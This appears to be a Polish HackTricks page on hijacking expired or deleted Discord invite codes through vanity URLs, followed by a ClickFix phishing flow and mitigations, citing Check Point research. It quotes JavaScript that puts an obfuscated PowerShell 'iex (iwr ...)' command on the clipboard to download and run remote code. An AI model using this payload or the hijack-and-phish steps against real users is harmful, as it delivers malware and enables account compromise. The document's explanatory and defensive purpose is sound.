# Przejmowanie zaproszeń Discord

{{#include ../../banners/hacktricks-training.md}}

Przejmowanie zaproszeń Discord wykorzystuje zasady ponownego użycia niestandardowych vanity links: wygasły tymczasowy kod zaproszenia lub usunięty stały kod składający się wyłącznie z małych liter i cyfr może zostać zarejestrowany jako vanity link na serverze z Level 3 Boost. Niestandardowy vanity link może również stać się dostępny, gdy jego pierwotny server utraci Level 3 Boost; w przypadku tymczasowego zaproszenia zawierającego wielkie litery attacker może wcześniej zarejestrować formę vanity zapisaną małymi literami, gdy zwykłe zaproszenie pozostaje aktywne, ale przekierowanie rozpocznie się dopiero po wygaśnięciu tego zaproszenia.<sup>[[1]](#references)[[2]](#references)</sup>

## Typy zaproszeń i ryzyko przejęcia

Zaobserwowane ryzyko różni się w zależności od typu zaproszenia:<sup>[[1]](#references)[[2]](#references)</sup>

| Typ zaproszenia                  | Możliwość przejęcia? | Warunek / Uwagi                                                                                       |
|----------------------------------|----------------------|---------------------------------------------------------------------------------------------------------|
| Tymczasowy link zaproszenia      | ✅                   | Po wygaśnięciu kod staje się dostępny i może zostać ponownie zarejestrowany jako vanity URL przez server z Boost. |
| Stały link zaproszenia            | ⚠️                   | Jeśli zostanie usunięty i składa się wyłącznie z małych liter i cyfr, kod może ponownie stać się dostępny. |
| Niestandardowy vanity link        | ✅                   | Jeśli pierwotny server utraci Level 3 Boost, jego vanity invite stanie się dostępne do ponownej rejestracji.    |

## Etapy exploitation

1. Rozpoznanie
- Monitoruj publiczne źródła (fora, media społecznościowe, kanały Telegram) w poszukiwaniu linków zaproszeń pasujących do wzorca `discord.gg/{code}` lub `discord.com/invite/{code}`.<sup>[[1]](#references)</sup>
- Zbieraj interesujące kody zaproszeń (tymczasowe lub vanity).<sup>[[1]](#references)</sup>
2. Wstępna rejestracja
- Utwórz server Discord z uprawnieniami Level 3 Boost lub użyj już istniejącego.<sup>[[1]](#references)[[2]](#references)</sup>
- W **Server Settings → Vanity URL** spróbuj przypisać docelowy kod zaproszenia. Jeśli zostanie zaakceptowany, kod zostanie zarezerwowany przez złośliwy server.<sup>[[1]](#references)</sup>
3. Aktywacja przejęcia
- W przypadku tymczasowych zaproszeń poczekaj, aż pierwotne zaproszenie wygaśnie (lub usuń je ręcznie, jeśli kontrolujesz źródło).<sup>[[1]](#references)</sup>
- W przypadku kodów zawierających wielkie litery wariant zapisany małymi literami można przejąć natychmiast, jednak przekierowanie zostanie aktywowane dopiero po wygaśnięciu zaproszenia.<sup>[[1]](#references)</sup>
4. Ciche przekierowanie
- Użytkownicy odwiedzający stary link zostaną płynnie przekierowani na server kontrolowany przez attackera, gdy przejęcie stanie się aktywne.<sup>[[1]](#references)</sup>

## Phishing za pośrednictwem servera Discord

1. Ogranicz kanały servera tak, aby widoczny był tylko kanał **#verify**.<sup>[[1]](#references)</sup>
2. Wdróż bota (np. **Safeguard#0786**), aby prosił nowych użytkowników o weryfikację za pośrednictwem OAuth2.<sup>[[1]](#references)</sup>
3. Bot przekierowuje użytkowników na stronę phishingową (np. `captchaguard.me`) pod pozorem CAPTCHA lub etapu weryfikacji.<sup>[[1]](#references)</sup>
4. Zastosuj sztuczkę UX **ClickFix**:<sup>[[1]](#references)</sup>
- Wyświetl komunikat o niedziałającym CAPTCHA.
- Poinstruuj użytkowników, aby otworzyli okno **Win+R**, wkleili wstępnie załadowane polecenie PowerShell i nacisnęli Enter.

### Przykład wstrzyknięcia do schowka za pomocą ClickFix

Kampania wykorzystywała JavaScript do skopiowania złośliwego polecenia PowerShell do schowka:<sup>[[1]](#references)</sup>
```javascript
// Copy malicious PowerShell command to clipboard
const cmd = `powershell -NoExit -Command "$r='NJjeywEMXp3L3Fmcv02bj5ibpJWZ0NXYw9yL6MHc0RHa';` +
`$u=($r[-1..-($r.Length)]-join '');` +
`$url=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u));` +
`iex (iwr -Uri $url)"`;
navigator.clipboard.writeText(cmd);
```
To podejście pozwala uniknąć bezpośredniego pobierania plików i wykorzystuje znane elementy interfejsu użytkownika, aby zmniejszyć podejrzliwość użytkownika.<sup>[[1]](#references)</sup>

## Mitigations

- Preferuj permanent invite links i upewnij się, że code zawiera co najmniej jedną wielką literę; usuniętych permanent codes zawierających wielkie litery nie można ponownie wykorzystać jako vanity links.<sup>[[1]](#references)</sup>
- Regularnie zmieniaj invite codes i unieważniaj stare links.
- Monitoruj status boostów serwera Discord oraz przejęcia vanity URL.<sup>[[1]](#references)[[2]](#references)</sup>
- Uświadamiaj użytkowników, aby weryfikowali autentyczność serwera i unikali wykonywania commands wklejanych ze schowka.

## References

- [1] [Od zaufania do zagrożenia: przejęte zaproszenia Discord wykorzystywane do wieloetapowego dostarczania malware](https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/)
- [2] [Niestandardowy link zaproszenia – Discord Support](https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link)
{{#include ../../banners/hacktricks-training.md}}
